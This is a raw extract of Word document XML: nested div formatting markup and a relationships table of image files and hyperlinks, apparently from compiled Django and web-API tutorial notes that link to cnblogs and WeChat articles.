                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="287470553">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="7760163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 w:id="128206188">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="16937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9256">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1683629701">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1963419474">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="1686790417">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330"/>
                      <w:divBdr>
                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                      </w:divBdr>
                    </w:div>
                    <w:div w:id="12000856">
                      <w:marLeft w:val="0"/>
                      <w:marRight w:val="0"/>
                      <w:marTop w:val="0"/>
                      <w:marBottom w:val="0"/>
                      <w:divBdr>
                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                      </w:divBdr>
                      <w:divsChild>
                        <w:div w:id="853572283">
                          <w:marLeft w:val="0"/>
                          <w:marRight w:val="0"/>
                          <w:marTop w:val="225"/>
                          <w:marBottom w:val="225"/>
                          <w:divBdr>
                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                          </w:divBdr>
                          <w:divsChild>
                            <w:div w:id="603269055">
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="120"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="12725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525607">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="13159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razyant.net/wp-content/uploads/2012/08/django.png" TargetMode="External"/><Relationship Id="rId299" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484269&amp;idx=1&amp;sn=c832969a57a138c33bb1e2b19235b5c9&amp;chksm=a73c6355904bea437b1480c018379583397948be69072114b41e98c50162bc135efbf5be3ce6&amp;scene=21" TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image11.jpeg"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image38.png"/><Relationship Id="rId159" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image86.png"/><Relationship Id="rId324" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483999&amp;idx=1&amp;sn=f58503f4fe983f5a09ee736551c5b502&amp;chksm=a73c6267904beb71f13259603c63d902a40471a5fe38a768d1be96beb4623f086cff10b4c960&amp;scene=21" TargetMode="External"/><Relationship Id="rId170" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image93.png"/><Relationship Id="rId226" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image116.png"/><Relationship Id="rId268" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483974&amp;idx=1&amp;sn=986b0534fbb9f10452ff77770d196a95&amp;chksm=a73c627e904beb68e8f562a498fa5da88bac00d2d6bbcba6fc81be90f0b48a58bc1b10619cf6&amp;scene=21" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image22.png"/><Relationship Id="rId74" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190705212730269-1847895786.png" TargetMode="External"/><Relationship Id="rId128" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1:8000/polls/" TargetMode="External"/><Relationship Id="rId335" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484224&amp;idx=1&amp;sn=fa83997a677450896c1ec678deb1f55f&amp;chksm=a73c6378904bea6e2c6e2e61bc2900bf2ddf235392e9979061f00ad8ce8b8c7864df8f1f02fd&amp;scene=21" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId181" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image101.png"/><Relationship Id="rId237" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483764&amp;idx=1&amp;sn=f0756dbb9887a05280e6464194477e1d&amp;chksm=a73c614c904be85a8380a0d93155a5f70b9cdecf716f452ff9274a9ebeac1c194001beed7b23&amp;scene=21" TargetMode="External"/><Relationship Id="rId279" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484136&amp;idx=1&amp;sn=b3f983f56a8d6fe94b3c137db5b9a209&amp;chksm=a73c62d0904bebc6709eacdcdff45bf5b1934036b9b884b8cbbe172c608c0f18336ae1e658a3&amp;scene=21" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/wdliu/p/9517535.html" TargetMode="External"/><Relationship Id="rId139" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image74.png"/><Relationship Id="rId290" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484200&amp;idx=1&amp;sn=f81da7b856e6b5bd737d675659f17d5e&amp;chksm=a73c6310904bea061a51f1de1c17fabab2c36100c680506e3c34915854c194082233d2aafb45&amp;scene=21" TargetMode="External"/><Relationship Id="rId304" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483759&amp;idx=1&amp;sn=ab30c1d66016306d05ab5caa8829794a&amp;chksm=a73c6157904be8419bff48476b0f37b6ed90244cfeb5f07595ac7d1ddd0bfc314e0523364153&amp;scene=21" TargetMode="External"/><Relationship Id="rId346" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484211&amp;idx=1&amp;sn=0cb4281bb0f4ba1b8f6347b565cadd56&amp;chksm=a73c630b904bea1de161951d07eee60e49662ab91439d7f534209927d8820699b7745eb72c81&amp;scene=21" TargetMode="External"/><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image49.png"/><Relationship Id="rId150" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/yum777/p/10575851.html" TargetMode="External"/><Relationship Id="rId192" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://views.py/" TargetMode="External"/><Relationship Id="rId206" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image112.png"/><Relationship Id="rId248" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483764&amp;idx=1&amp;sn=f0756dbb9887a05280e6464194477e1d&amp;chksm=a73c614c904be85a8380a0d93155a5f70b9cdecf716f452ff9274a9ebeac1c194001beed7b23&amp;scene=21" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.jpeg"/><Relationship Id="rId108" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706220846528-200643828.png" TargetMode="External"/><Relationship Id="rId315" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483841&amp;idx=1&amp;sn=cac2440f92404724a563c1e8f3991816&amp;chksm=a73c61f9904be8efb84bea87dcd75baf538617da1d9fb6cd65c1a7df12ed9f4bc21a9deae75a&amp;scene=21" TargetMode="External"/><Relationship Id="rId357" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190704190349324-791431678.png" TargetMode="External"/><Relationship Id="rId96" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706170944635-88892026.png" TargetMode="External"/><Relationship Id="rId161" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image88.png"/><Relationship Id="rId217" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/goods/ID" TargetMode="External"/><Relationship Id="rId259" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483796&amp;idx=1&amp;sn=f9dd96a08e632553c53849dcb2cd26ef&amp;chksm=a73c61ac904be8ba6d4dc6e2c7552199fe1329c44c98df4603265059dd1dd4b718ec55576ede&amp;scene=21" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.jpeg"/><Relationship Id="rId119" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.crazyant.net/wp-content/uploads/2012/08/34ad5af4a9ee.png" TargetMode="External"/><Relationship Id="rId270" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484044&amp;idx=1&amp;sn=e200dca29baadfd55a80cbf10e5342d9&amp;chksm=a73c62b4904beba2cf7290f9d5f7a72c6157c05aa2e7abaa554b7f620c7549963ecea9c04636&amp;scene=21" TargetMode="External"/><Relationship Id="rId326" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484026&amp;idx=1&amp;sn=3f320aa57ac00c3fef4ea249228ccf6f&amp;chksm=a73c6242904beb545006e523208638051c79ea2e4bb6504e7a019761f8dd2bfc9269d12324ca&amp;scene=21" TargetMode="External"/><Relationship Id="rId65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image39.png"/><Relationship Id="rId130" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image71.png"/><Relationship Id="rId172" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.213.name/archives/1105" TargetMode="External"/><Relationship Id="rId228" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://yiyibooks.cn/__trs__/xx/django_182/ref/settings.html" TargetMode="External"/><Relationship Id="rId281" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484176&amp;idx=1&amp;sn=579a7c87c9da62c55306bfc94fef1ee2&amp;chksm=a73c6328904bea3ea075378a4a82d18de859f9dabd62ef174061601ba42662221674bfed0ffe&amp;scene=21" TargetMode="External"/><Relationship Id="rId337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image24.jpeg"/><Relationship Id="rId76" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706120328789-2097485989.png" TargetMode="External"/><Relationship Id="rId141" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image76.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/endnotes" Target="endnotes.xml"/><Relationship Id="rId183" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image102.jpeg"/><Relationship Id="rId239" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483679&amp;idx=2&amp;sn=9e3db4167e408a2a0c3a1037c4f7266a&amp;chksm=a73c6127904be831aee7abe13980fbea5e2d611ceb48e346dc0fc083c0a8725b52ebb3b8106f&amp;scene=21" TargetMode="External"/><Relationship Id="rId250" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483813&amp;idx=1&amp;sn=bda48ff63fd4cc3b2cc0de408e7a1fa1&amp;chksm=a73c619d904be88b13d9c27bc4afb5ca45c76473c5d56cf3b5a0f7f9cf7a57775168ff6150f1&amp;scene=21" TargetMode="External"/><Relationship Id="rId292" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483911&amp;idx=1&amp;sn=cb66b1179996ca1107af279cf40eb5ff&amp;chksm=a73c623f904beb29ebd1c4934ac1cc94e936b6615ed9dd9e258fa1d92d0c04b08c765c6b5d86&amp;scene=21" TargetMode="External"/><Relationship Id="rId306" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483772&amp;idx=1&amp;sn=e80169eda0b9a1919b6351c40a49fd70&amp;chksm=a73c6144904be852b223ea196e6b8650e257519d4b7c7797e0c17858704e5f3e94244d858e09&amp;scene=21" TargetMode="External"/><Relationship Id="rId45"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62.png"/><Relationship Id="rId348" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484200&amp;idx=1&amp;sn=f81da7b856e6b5bd737d675659f17d5e&amp;chksm=a73c6310904bea061a51f1de1c17fabab2c36100c680506e3c34915854c194082233d2aafb45&amp;scene=21" TargetMode="External"/><Relationship Id="rId152" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image79.png"/><Relationship Id="rId194" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image108.png"/><Relationship Id="rId208" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image114.png"/><Relationship Id="rId261" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483914&amp;idx=1&amp;sn=368657c4efc342d7d8e26a23f8209eb0&amp;chksm=a73c6232904beb249bd3705fdd09176b97fac5f49f152f846d5d10a3dac34e9ae88614f4e43d&amp;scene=21" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4.jpeg"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190704190727619-758595165.png" TargetMode="External"/><Relationship Id="rId317" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483857&amp;idx=2&amp;sn=85588634313b194d256888016ff501bc&amp;chksm=a73c61e9904be8ff644466e393889d868512f085ff5a8283a56f1ff7aea80b4aeb694e264745&amp;scene=21" TargetMode="External"/><Relationship Id="rId359" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706171211613-721761932.png" TargetMode="External"/><Relationship Id="rId121" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.crazyant.net/wp-content/uploads/2012/08/dsf.png" TargetMode="External"/><Relationship Id="rId163" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.213.name/wp-content/uploads/2017/08/celery.png" TargetMode="External"/><Relationship Id="rId219" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/goods?offset=10" TargetMode="External"/><Relationship Id="rId230" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483665&amp;idx=1&amp;sn=19875184517f6513e53bec3b91c10202&amp;chksm=a73c6129904be83f13ff0501c1159b4e3b776f086613ce4e3fdff2b525aa361cee819f5ebd77&amp;scene=21" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image15.jpeg"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image30.png"/><Relationship Id="rId67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image40.png"/><Relationship Id="rId272" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId293" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484237&amp;idx=1&amp;sn=c2d050ff33d2957e8971034476cd8326&amp;chksm=a73c6375904bea639b58f93cb82e714e8ae339f195818179ad9cb15e1413a2b63fcd1f30039f&amp;scene=21" TargetMode="External"/><Relationship Id="rId307" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483791&amp;idx=1&amp;sn=9ca6cc22476d2ede5cc320fd1b7f6525&amp;chksm=a73c61b7904be8a181297546dd7565a8e5b001f5a43c8cc544f4564c2634920642a3a0f6607c&amp;scene=21" TargetMode="External"/><Relationship Id="rId328" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484093&amp;idx=1&amp;sn=464529000243bed9acf6dbacb6560a2a&amp;chksm=a73c6285904beb939d2e8cea86a10248a520599adfbd06128c4e60fce373111195819c4b4e1c&amp;scene=21" TargetMode="External"/><Relationship Id="rId349" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId88" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706164845114-1045510757.png" TargetMode="External"/><Relationship Id="rId111" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image63.png"/><Relationship Id="rId132" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/sui776265233/p/9664642.html" TargetMode="External"/><Relationship Id="rId153" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image80.png"/><Relationship Id="rId174" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image96.png"/><Relationship Id="rId195" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.zhihu.com/column/python-web-django" TargetMode="External"/><Relationship Id="rId209" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.example.com/" TargetMode="External"/><Relationship Id="rId220" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/goods?page=2&amp;per_page=20" TargetMode="External"/><Relationship Id="rId241" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483665&amp;idx=1&amp;sn=19875184517f6513e53bec3b91c10202&amp;chksm=a73c6129904be83f13ff0501c1159b4e3b776f086613ce4e3fdff2b525aa361cee819f5ebd77&amp;scene=21" TargetMode="Externa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35.png"/><Relationship Id="rId262" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483923&amp;idx=1&amp;sn=7b350213d01de2b29005bed5e78941fb&amp;chksm=a73c622b904beb3d5ae0fe0abdd6f585ba23be0cc943a1594e446343e1aa0235441627ab1dfa&amp;scene=21" TargetMode="External"/><Relationship Id="rId283" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483949&amp;idx=1&amp;sn=bc4c8929d5f8e99a769c63f2208ed6eb&amp;chksm=a73c6215904beb033f3277e3d1a98aaeece313792649cf96eea77cb1ee3d06bb493d06bc0c99&amp;scene=21" TargetMode="External"/><Relationship Id="rId318" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483871&amp;idx=1&amp;sn=a2043390f34a84d91875a9a20b06de9e&amp;chksm=a73c61e7904be8f14dedd23d49465adb4d126c4f1d367cd01eecab9020c9fc46be51dcca0db9&amp;scene=21" TargetMode="External"/><Relationship Id="rId339" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId78" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706121021645-374321809.png" TargetMode="External"/><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image56.png"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image57.png"/><Relationship Id="rId122" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image67.png"/><Relationship Id="rId143" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image78.png"/><Relationship Id="rId164" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image90.png"/><Relationship Id="rId185" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image104.png"/><Relationship Id="rId350" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/Infernal/p/11236529.html" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.jpeg"/><Relationship Id="rId210" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/app/1.0/info" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image16.jpeg"/><Relationship Id="rId231" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId252" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483679&amp;idx=2&amp;sn=9e3db4167e408a2a0c3a1037c4f7266a&amp;chksm=a73c6127904be831aee7abe13980fbea5e2d611ceb48e346dc0fc083c0a8725b52ebb3b8106f&amp;scene=21" TargetMode="External"/><Relationship Id="rId273" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483887&amp;idx=2&amp;sn=3d8531c15ffda4faa32bde775bfd61fb&amp;chksm=a73c61d7904be8c1621603284549aa7eca6e144d8603e6759172d6b5a6b92a0bf6e08ab2d672&amp;scene=21" TargetMode="External"/><Relationship Id="rId294" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId308" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483796&amp;idx=1&amp;sn=f9dd96a08e632553c53849dcb2cd26ef&amp;chksm=a73c61ac904be8ba6d4dc6e2c7552199fe1329c44c98df4603265059dd1dd4b718ec55576ede&amp;scene=21" TargetMode="External"/><Relationship Id="rId329" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/wcwnina/p/9099561.html" TargetMode="External"/><Relationship Id="rId68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190705210454697-1839069198.png" TargetMode="External"/><Relationship Id="rId89" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image51.png"/><Relationship Id="rId112" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/laixiangran/p/9064769.html" TargetMode="External"/><Relationship Id="rId133" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" 